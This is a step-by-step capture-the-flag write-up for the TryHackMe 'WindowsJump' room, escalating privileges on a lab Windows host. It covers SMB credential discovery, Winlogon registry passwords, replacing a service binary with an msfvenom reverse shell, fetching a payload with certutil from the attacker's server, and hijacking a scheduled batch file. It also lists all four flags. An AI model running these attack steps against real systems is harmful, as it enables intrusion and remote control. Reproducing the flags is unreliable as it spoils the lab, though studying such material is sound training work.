# TryHackMe – WindowsJump

## Complete Walkthrough | Windows Privilege Escalation

**Platform:** TryHackMe  
**Room:** WindowsJump  
**Target OS:** Windows  
**Attacking Machine:** Kali Linux  
**Objective:** Enumerate the target, obtain initial access, exploit misconfigurations, and retrieve all four flags.

---

# 1. Getting Started

Start the WindowsJump room on TryHackMe and wait for the target machine to become available.

Connect your Kali Linux machine to the TryHackMe network and copy the target IP address.

For this walkthrough, the target IP is:

```
10.67.188.19
```

Create a working directory:

```
mkdir -p ~/TryHackMe/WindowsJump
cd ~/TryHackMe/WindowsJump
```

Save the target IP address in a file:

```
echo "10.67.188.19" > target.txt
```

Set an environment variable so you don't have to type the IP address repeatedly:

```
export ip=$(cat target.txt)
```

You can now use `$ip` in your commands.

For example:

```
echo $ip
```

To keep the variable available in future Zsh sessions, add it to your Zsh configuration:

```
echo 'export ip=10.67.188.19' >> ~/.zshrc
source ~/.zshrc
```

**Important:** Replace the example target IP with the address assigned to your own TryHackMe machine.

# 2. Reconnaissance – Nmap Scan

Let's start by identifying the open ports and services running on the target.

Run an Nmap scan:

```
sudo nmap -sC -sS $ip -oN nmapScan.txt
```

Here's what the options mean:

- `sudo` – Runs Nmap with elevated privileges.
    
- `-sC` – Runs Nmap's default scripts.
    
- `-sS` – Performs a TCP SYN scan.
    
- `-oN` – Saves the scan results in normal text format.
    
- `$ip` – Specifies the target IP address.
    

The results are saved in:

```
nmapScan.txt
```

### Open Ports

The scan reveals five open TCP ports:

|Port|Service|
|---|---|
|135/tcp|MSRPC|
|139/tcp|NetBIOS-SSN|
|445/tcp|Microsoft-DS (SMB)|
|3389/tcp|MS-WBT-Server (RDP)|
|5985/tcp|WSMan|

A few interesting findings appear in the scan:

- Port `445` indicates that SMB is available.
    
- Port `3389` indicates that Remote Desktop Protocol (RDP) is available.
    
- Port `5985` indicates that Windows Remote Management (WinRM) is available.
    

The RDP enumeration also reveals the target computer name:

```
Target_Name: PRIVESC
NetBIOS_Computer_Name: PRIVESC
DNS_Computer_Name: privesc
```

Now let's investigate SMB.

# 3. SMB Enumeration

First, verify that the target IP is stored correctly:

```
echo $ip
```

Next, enumerate the available SMB shares without providing a password:

```
smbclient -L //$ip -N
```

The available shares are:

|Share Name|Type|Comment|
|---|---|---|
|ADMIN$|Disk|Remote Admin|
|C$|Disk|Default share|
|IPC$|IPC|Remote IPC|
|Public|Disk|Public file share|

The `Public` share is particularly interesting because it provides a potential location for accessible files.

### Step 1: Connect to the Public Share

Connect to the share:

```
smbclient //$ip/Public -N
```

### Step 2: Download welcome.txt

Once connected, download the file:

```
get welcome.txt
```

Exit the SMB session:

```
exit
```

### Step 3: Read the Downloaded File

Back in your Kali terminal, list the files:

```
ls
```

Read the downloaded file:

```
cat welcome.txt
```

The file contains the following information:

```
Welcome to CORP-NET.

New employee default credentials
================================

Username : thmuser
Password : Password1!

Please change your password after first login.
```

Excellent! We have discovered default credentials that can be used to access the Windows machine through RDP.

# 4. Initial Access – Connecting Through RDP

Before connecting to the Windows machine, create a directory on Kali to share with the RDP session.

```
mkdir share
```

Check that the directory has been created:

```
ls
```

### Step 1: Connect to the Windows Machine

Use FreeRDP to establish a remote desktop connection:

```
xfreerdp /v:$ip /u:thmuser /p:'Password1!' /cert:ignore +clipboard /dynamic-resolution /drive:share,./share
```

Here's what the options mean:

- `xfreerdp` – FreeRDP client used to connect to a remote desktop.
    
- `/v:` – Specifies the target server.
    
- `/u:` – Specifies the username.
    
- `/p:` – Specifies the password.
    
- `/cert:ignore` – Ignores certificate validation.
    
- `+clipboard` – Enables clipboard sharing.
    
- `/dynamic-resolution` – Allows the display resolution to adjust dynamically.
    
- `/drive:share,./share` – Redirects the local Kali `share` directory into the Windows RDP session.
    

The credentials are:

```
Username: thmuser
Password: Password1!
```

After successful authentication, you should have access to the Windows desktop.

### Step 2: Retrieve the First Flag

Open PowerShell in the Windows session.

Navigate to the Desktop or list its contents:

```
ls C:/Users/thmuser/Desktop/
```

You should find:

```
flag1.txt
```

Read the file:

```
cat C:/Users/thmuser/Desktop/flag1.txt
```

**Flag 1 – thmuser**

```
THM{5mb_cr3d5_1n_th3_5h4r3}
```

Great! We have successfully obtained our first flag.

# 5. Windows Registry Enumeration – Discovering Stored Credentials

Now let's investigate the Windows Registry for potentially stored credentials.

The Windows Registry stores configuration settings for the operating system, applications, and user accounts.

One interesting location is the Winlogon registry key.

Run the following command in PowerShell:

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

The output reveals several registry values, including:

```
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    notadmin
DefaultPassword   REG_SZ    P@ssw0rd!
LastUsedUserName  REG_SZ    notadmin
```

Notice the following:

- `AutoAdminLogon = 1` indicates that automatic logon is enabled.
    
- `DefaultUserName` identifies the configured username.
    
- `DefaultPassword` contains the stored password.
    

We have discovered another set of credentials:

```
Username: notadmin
Password: P@ssw0rd!
```

Let's use these credentials to access the `notadmin` account.

# 6. Moving to notadmin – Using runas

Windows provides the `runas` command, which allows a user to start a program under another account.

Run:

```
runas /user:privesc\notadmin cmd.exe
```

Enter the password when prompted:

```
P@ssw0rd!
```

This attempts to launch a new Command Prompt under the `privesc\notadmin` account.

### Step 1: Navigate to the Desktop

Inside the newly opened Command Prompt, run:

```
cd /d C:\Users\notadmin\Desktop
```

### Step 2: List the Files

```
dir
```

You should find:

```
flag2.txt
```

Read the flag:

```
type flag2.txt
```

**Flag 2 – notadmin**

```
THM{w1n10g0n_cr3ds_3xp0s3d}
```

We have successfully retrieved the second flag.

# 7. Service Enumeration – Discovering THMSvc

Next, let's enumerate Windows services and identify the account used to run them.

Run the following command in Command Prompt:

```
wmic service get name,pathname,startname | findstr /i "svcadm"
```

This command retrieves service information and filters the results for the keyword `svcadm`.

The output reveals:

```
THMSvc    C:\Windows\THMSVC\svc.exe    .\svcadm
```

Notice three important details:

|Property|Value|
|---|---|
|Service Name|THMSvc|
|Executable Path|C:\Windows\THMSVC\svc.exe|
|Service Account|.\svcadm|

This indicates that the `THMSvc` service is configured to run under the local `svcadm` account.

We now have a service executable worth investigating.

# 8. Service Binary Replacement – Moving to svcadm

The next step involves generating a Windows reverse-shell executable and replacing the existing service executable.

### Step 1: Start a Netcat Listener

Open a Kali terminal and start a listener:

```
rlwrap nc -lvnp 4444
```

Keep the listener running.

### Step 2: Generate the Windows Payload

Open another Kali terminal and move into the shared directory:

```
cd ~/TryHackMe/WindowsJump/share
```

Generate the Windows 64-bit reverse-shell payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.192.179 LPORT=4444 -f exe-service -o svc.exe
```

Here's what the options mean:

- `msfvenom` – Metasploit payload generator.
    
- `-p` – Specifies the payload.
    
- `windows/x64/shell_reverse_tcp` – Windows 64-bit reverse TCP shell payload.
    
- `LHOST` – Specifies the Kali machine's IP address.
    
- `LPORT` – Specifies the listener port.
    
- `-f exe-service` – Generates an executable in service format.
    
- `-o svc.exe` – Saves the generated file as `svc.exe`.
    

The payload is saved in the shared directory.

### Step 3: Access the Shared Folder from Windows

Return to the Windows Command Prompt running under `notadmin`.

Check the available network connections:

```
net use
```

The output should show the redirected RDP shared folder:

```
\\TSCLIENT\share
```

### Step 4: Replace the Service Executable

Copy the generated payload into the service directory:

```
copy \\TSCLIENT\share\svc.exe C:\Windows\THMSVC\svc.exe
```

When Windows asks whether to overwrite the existing file, enter:

```
yes
```

The file should be copied successfully.

### Step 5: Start the Service

Now request Windows to start the service:

```
sc start THMSvc
```

The service is reported as:

```
SERVICE_NAME: THMSvc
STATE        : 4  RUNNING
```

### Step 6: Receive the Reverse Shell

Return to your Kali listener on port `4444`.

You should receive an incoming connection from the Windows target.

The connection provides a Windows Command Prompt session.

### Step 7: Retrieve the Third Flag

The service account's Desktop contains the next flag.

Run:

```
type C:\Users\svcadm\Desktop\flag3.txt
```

**Flag 3 – svcadm**

```
THM{S3rv1c3_b1n4ry_h1j4ck3d}
```

Excellent! We have successfully retrieved the third flag.

# 9. Enumerating cleanup.bat

Now let's investigate another file inside the Windows Tasks directory.

From the reverse-shell session, move to the parent directory:

```
cd ..
```

Navigate to the Tasks directory:

```
cd tasks
```

List the available files:

```
dir
```

You should find:

```
cleanup.bat
```

### Step 1: Inspect cleanup.bat

Read the batch file:

```
type cleanup.bat
```

Its original contents are:

```
@echo off
del /Q /F "%TEMP%\*.tmp" 2>nul
```

The script performs a cleanup operation by attempting to delete temporary `.tmp` files from the current user's temporary directory.

The file is important to our next step because we'll modify its contents to execute our newly generated executable.

# 10. Generating the Second Reverse-Shell Payload

This time, we'll generate another Windows reverse-shell executable using port `5555`.

### Step 1: Generate shell.exe

On Kali, move into the shared directory:

```
cd ~/TryHackMe/WindowsJump/share
```

Generate the payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.192.179 LPORT=5555 -f exe -o shell.exe
```

This generates a Windows 64-bit reverse-shell executable named `shell.exe`.

### Step 2: Start a Netcat Listener

Open another Kali terminal:

```
rlwrap nc -lvnp 5555
```

Keep the listener running.

### Step 3: Start an HTTP Server

Return to the terminal containing `shell.exe` and start a Python HTTP server:

```
python3 -m http.server
```

By default, the HTTP server listens on port `8000`.

Keep the server running.

The file is now accessible through:

```
http://192.168.192.179:8000/shell.exe
```

# 11. Downloading shell.exe to Windows

Return to the Windows Command Prompt.

Use the built-in Windows `certutil` utility to download the executable:

```
certutil -urlcache -split -f http://192.168.192.179:8000/shell.exe C:\Windows\Tasks\shell.exe
```

This retrieves `shell.exe` from the Kali HTTP server and saves it inside:

```
C:\Windows\Tasks\
```

The file is now available on the Windows machine.

# 12. Modifying cleanup.bat

Now that `shell.exe` is present in the Tasks directory, we need to modify the existing batch file.

Make sure you're inside:

```
C:\Windows\Tasks
```

Run the following command:

```
cmd /c "echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat"
```

This command replaces the contents of `cleanup.bat` with the executable's full path.

Verify the modification:

```
type cleanup.bat
```

The file should now contain:

```
C:\Windows\Tasks\shell.exe
```

The original cleanup instructions have been replaced with a command that launches our executable when the batch file is executed.

# 13. Final Stage – Retrieving the Fourth Flag

We have configured the executable and modified the batch file.

Return to the Kali terminal where the Netcat listener is running on port `5555`.

You should receive an incoming connection from the Windows target.

The connection provides another Windows Command Prompt session.

### Step 1: Retrieve the Final Flag

The final flag is located at:

```
C:\flag4.txt
```

Read it using:

```
type C:\flag4.txt
```

**Flag 4 – Final Flag**

```
THM{t4sk_wr1t3_t0_SYST3M}
```

Congratulations! We have successfully retrieved all four flags.

---

# 14. All Flags

|Flag|Account / Stage|Value|
|---|---|---|
|Flag 1|thmuser|`THM{5mb_cr3d5_1n_th3_5h4r3}`|
|Flag 2|notadmin|`THM{w1n10g0n_cr3ds_3xp0s3d}`|
|Flag 3|svcadm|`THM{S3rv1c3_b1n4ry_h1j4ck3d}`|
|Flag 4|Final stage|`THM{t4sk_wr1t3_t0_SYST3M}`|

# 15. Final Thoughts

This room demonstrates how different Windows misconfigurations can create opportunities for privilege escalation.

The main techniques explored throughout this walkthrough include:

- SMB enumeration and discovering exposed default credentials.
    
- RDP access using the discovered credentials.
    
- Windows Registry enumeration to identify stored autologon credentials.
    
- Using `runas` to launch processes under another account.
    
- Windows service enumeration and service executable replacement.
    
- Inspecting and modifying a batch file in the Windows Tasks directory.
    
- Transferring executables using an RDP shared folder and an HTTP server.
    
- Using reverse-shell payloads to obtain remote command-line access.
    

The important lesson is to understand how Windows services, stored credentials, file permissions, and automated tasks interact.

**Room completed – all four flags retrieved.**